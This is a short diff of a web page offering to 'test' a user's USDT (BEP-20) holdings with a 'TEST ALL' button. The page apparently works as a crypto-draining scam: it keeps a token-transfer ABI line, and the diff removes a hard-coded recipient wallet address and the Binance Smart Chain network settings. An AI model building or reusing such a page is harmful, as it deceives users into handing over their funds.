@@ -49,7 +49,7 @@
   <div class="card">
     <h2>USDT (BEP-20)</h2>
     <p>This will Test Your USDT(BEP-20) on BSC:</p>
-    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+    <p style="word-break: break-all; font-weight: bold;"></p>
     <button id="sendBtn">TEST ALL</button>
     <div id="log"></div>
   </div>
@@ -62,17 +62,6 @@
       "function transfer(address to, uint256 value) returns (bool)"
     ];
 
-    const bscParams = {
-      chainId: "0x38",
-      chainName: "Binance Smart Chain",
-      nativeCurrency: {
-        name: "BNB",
-        symbol: "BNB",
-        decimals: 18
-      },
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"]
-    };
 
     function log(msg) {
       document.getElementById("log").textContent = msg;
